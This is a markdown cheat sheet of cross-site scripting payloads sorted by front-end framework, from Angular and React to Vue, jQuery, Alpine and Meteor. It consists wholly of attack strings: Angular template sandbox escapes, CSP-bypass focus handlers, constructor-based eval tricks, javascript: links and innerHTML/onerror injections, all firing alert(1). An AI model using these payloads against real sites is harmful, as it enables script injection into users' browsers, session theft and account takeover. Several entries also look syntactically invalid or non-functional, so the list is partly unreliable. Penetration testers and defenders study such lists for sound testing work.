# Framework-Specific XSS Payloads - 2025 Edition

# Angular
{{constructor.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
<div ng-app>{{$eval.constructor('alert(1)')()}}</div>
<div ng-app ng-csp><textarea autofocus ng-focus=$event.view.alert(1)></textarea></div>
<div ng-app ng-csp><input autofocus ng-focus=$event.path[0].ownerDocument.defaultView.alert(1)></div>
<div ng-app ng-csp><input autofocus ng-focus="$event.composedPath()[0].getRootNode().defaultView.alert(1)"></div>

# React
<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>
<a href="javascript:alert(1)">click me</a>
<img src="x" onError={(e) => {window.onerror=alert;throw 1}}/>
<img src="x" onError={window.onerror=alert;throw 1}/>
React.createElement("img", {src: "x", onError: (e) => {alert(1)}})
React.createElement("img", {src: "x", onError: "alert(1)"})
<component is="script">alert(1)</component>

# Vue.js
<div v-html="'<img src=x onerror=alert(1)>'"></div>
<template v-if="''.constructor.constructor('alert(1)')()"></template>
<div v-bind:onclick="''.constructor.constructor('alert(1)')()">click me</div>
<div v-on:click="''.constructor.constructor('alert(1)')()">click me</div>
<div v-on:click="$event.view.alert(1)">click me</div>
<div v-on:click="(function(){alert(1)})()">click me</div>
<svg><a v-bind:href="'javascript:alert(1)'"><circle r=100></circle></a></svg>

# Svelte
<div bind:innerHTML={"<img src=x onerror=alert(1)>"} />
<div on:click={() => eval("alert(1)")} />
<div on:click|once={window.alert(1)} />
<div use:action={() => alert(1)} />

# Ember.js
{{html-safe "<img src=x onerror=alert(1)>"}}
<div onclick={{action (mut this.prop) "alert(1)"}}></div>
<input value={{html-safe "<img src=x onerror=alert(1)>"}} />

# jQuery
$("selector").html("<img src=x onerror=alert(1)>")
$("selector").append("<img src=x onerror=alert(1)>")
$("selector").prepend("<img src=x onerror=alert(1)>")
$("selector").after("<img src=x onerror=alert(1)>")
$("selector").before("<img src=x onerror=alert(1)>")
$("selector").replaceWith("<img src=x onerror=alert(1)>")
$("selector").attr("onclick", "alert(1)")

# Alpine.js
<div x-data="{ payload: '<img src=x onerror=alert(1)>' }" x-html="payload"></div>
<div x-data x-init="eval('alert(1)')"></div>
<div x-data x-on:click="eval('alert(1)')">Click me</div>
<div x-data="{}" x-init="$el.innerHTML='<img src=x onerror=alert(1)>'"></div>

# Lit/Web Components
<my-element .innerHTML=${"<img src=x onerror=alert(1)>"}>
class XssElement extends HTMLElement {
  connectedCallback() {
    this.innerHTML = "<img src=x onerror=alert(1)>";
  }
}
customElements.define('xss-element', XssElement);
<xss-element></xss-element>

# Solid.js
<div innerHTML={"<img src=x onerror=alert(1)>"} />
<div onClick={() => eval("alert(1)")} />
<div ref={el => el.innerHTML = "<img src=x onerror=alert(1)>"} />

# Preact
<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />
<img src="x" onError={() => alert(1)} />

# Stimulus
<div data-controller="xss" data-action="click->xss#exploit"></div>
// In controller: exploit() { eval("alert(1)") }

# Meteor
{{{unsafeHtml}}} <!-- Where unsafeHtml = "<img src=x onerror=alert(1)>" -->
Template.instance().$('selector').html("<img src=x onerror=alert(1)>");
